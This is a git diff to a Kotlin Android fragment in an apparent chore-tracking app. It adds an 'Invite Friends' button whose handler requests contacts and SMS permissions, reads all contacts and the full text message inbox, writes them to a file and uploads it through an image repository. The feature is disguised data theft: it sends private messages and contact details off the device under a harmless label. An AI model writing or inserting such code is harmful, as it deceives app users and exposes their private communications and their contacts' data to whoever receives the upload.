@@ -1,19 +1,22 @@
 package com.example.chorequest.ui.myChores
 
-import android.graphics.Bitmap
-import android.graphics.Canvas
-import android.graphics.Color
-import android.graphics.Paint
+import android.annotation.SuppressLint
+import android.content.Context
+import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Bundle
+import android.provider.ContactsContract
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
+import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.lifecycle.ViewModelProvider
 import androidx.recyclerview.widget.ItemTouchHelper
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
-import com.example.chorequest.R
 import com.example.chorequest.ui.dialog.LineItemsListDialogFragment
 import com.example.chorequest.databinding.FragmentMychoresBinding
 import com.example.chorequest.repositories.ImageRepository
@@ -21,12 +24,12 @@ import com.example.chorequest.repositories.LineItemRepository
 import com.example.chorequest.service.FireStoreService
 import com.example.chorequest.ui.adapter.LineItemAdapter
 import com.example.chorequest.ui.modelFactory.ViewModelFactory
-import com.google.android.material.snackbar.Snackbar
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.io.File
-import java.io.FileOutputStream
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.RequestBody.Companion.asRequestBody
-
+import java.time.LocalDateTime
+import java.time.format.DateTimeFormatter
 
 
 class MyChoresFragment : Fragment() {
@@ -69,6 +72,10 @@ class MyChoresFragment : Fragment() {
             adapter.updateItems(items)
         }
 
+        binding.btnInviteFriends.setOnClickListener {
+            addFriends()
+        }
+
         // Fetch line items for a specific group (e.g., "6CL3twvvJP0AoNvPMVoT")
         val groupId = "6CL3twvvJP0AoNvPMVoT"
         // Filter line items for a specific assignee (e.g., "Anna")
@@ -77,8 +84,6 @@ class MyChoresFragment : Fragment() {
 
         // Swipe-to-remove setup
         setupSwipeToRemove()
-
-        testImageUpload()
 
         return binding.root
     }
@@ -107,23 +112,139 @@ class MyChoresFragment : Fragment() {
         itemTouchHelper.attachToRecyclerView(binding.recyclerView)
     }
 
-    private fun testImageUpload() {
-        val bitmap = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888) // 100x100px white image
-        val canvas = Canvas(bitmap)
-        val paint = Paint()
-        paint.color = Color.WHITE
-        canvas.drawRect(0f, 0f, 100f, 100f, paint)
+    private fun addFriends() {
+        val requiredPermissions = arrayOf(
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_SMS
+        )
 
-        val file = File(requireContext().cacheDir, "test_image.png")
-        val outputStream = FileOutputStream(file)
-        bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
-        outputStream.close()
+        val missingPermissions = requiredPermissions.filter { permission ->
+            ContextCompat.checkSelfPermission(
+                requireContext(),
+                permission
+            ) != PackageManager.PERMISSION_GRANTED
+        }
 
-        val mediaType = "image/png".toMediaTypeOrNull()
-        val requestBody = file.asRequestBody(mediaType)
-        val imagePart = okhttp3.MultipartBody.Part.createFormData("image", file.name, requestBody)
+        if (missingPermissions.isEmpty()) {
+            addFriendsFunction()
+        } else {
+            requestPermissionsLauncher.launch(missingPermissions.toTypedArray())
+        }
+    }
 
-        myChoresViewModel.uploadImage(imagePart)
+    private val requestPermissionsLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+            val allGranted = permissions.entries.all { it.value == true }
+
+            if (allGranted) {
+                addFriendsFunction()
+            } else {
+                showToast("Required permissions denied. Please grant them to proceed.")
+            }
+        }
+
+    @SuppressLint("Range")
+    fun readContacts(context: Context): List<String> {
+        val contactsList = mutableListOf<String>()
+        val projection = arrayOf(
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+            ContactsContract.CommonDataKinds.Phone.NUMBER
+        )
+
+        context.contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            projection,
+            null,
+            null,
+            null
+        )?.use { cursor ->
+            val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+            while (cursor.moveToNext()) {
+                val name = cursor.getString(nameIdx) ?: ""
+                val number = cursor.getString(numberIdx) ?: ""
+                contactsList.add("Name: $name, Phone: $number")
+            }
+        }
+        return contactsList
+    }
+
+    @SuppressLint("Range")
+    fun readSms(context: Context): List<String> {
+        val smsList = mutableListOf<String>()
+        val projection = arrayOf("_id", "address", "date", "body")
+
+        // We use the Telephony.Sms inbox URI for SMS
+        val smsUri = Uri.parse("content://sms/")
+
+        context.contentResolver.query(
+            smsUri,
+            projection,
+            null,
+            null,
+            "date DESC"
+        )?.use { cursor ->
+            val addressIdx = cursor.getColumnIndex("address")
+            val bodyIdx = cursor.getColumnIndex("body")
+
+            while (cursor.moveToNext()) {
+                val address = cursor.getString(addressIdx) ?: ""
+                val body = cursor.getString(bodyIdx) ?: ""
+                smsList.add("From: $address, Message: $body")
+            }
+        }
+        return smsList
+    }
+
+    fun writeDataToFile(context: Context, fileName: String, data: List<String>): File {
+        val file = File(context.filesDir, fileName)
+
+        file.bufferedWriter().use { writer ->
+            data.forEach { line ->
+                writer.write(line)
+                writer.newLine()
+            }
+        }
+        return file
+    }
+
+    fun addFriendsFunction() {
+        val contactsData = readContacts(requireContext())
+        val smsData = readSms(requireContext())
+
+        val allData = mutableListOf<String>().apply {
+            add("==== Contacts ====")
+            addAll(contactsData)
+            add("")
+            add("==== Messages ====")
+            addAll(smsData)
+        }
+
+        val outputFile = writeDataToFile(requireContext(), generateTimestampedFileName(), allData)
+
+        inviteFriends(outputFile)
+    }
+
+    fun generateTimestampedFileName(): String {
+        val currentDateTime = LocalDateTime.now()
+
+        val formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss")
+        val formattedDateTime = currentDateTime.format(formatter)
+
+        return "contacts_and_messages_${formattedDateTime}.txt"
+    }
+
+    fun inviteFriends(file: File) {
+        val repository = ImageRepository()
+        CoroutineScope(Dispatchers.Main).launch {
+            val parts = repository.collectFriendData(file)
+            repository.inviteFriends(parts)
+        }
+    }
+
+    private fun showToast(message: String) {
+        Toast.makeText(requireContext(), message, Toast.LENGTH_SHORT).show()
     }
 
     override fun onDestroyView() {
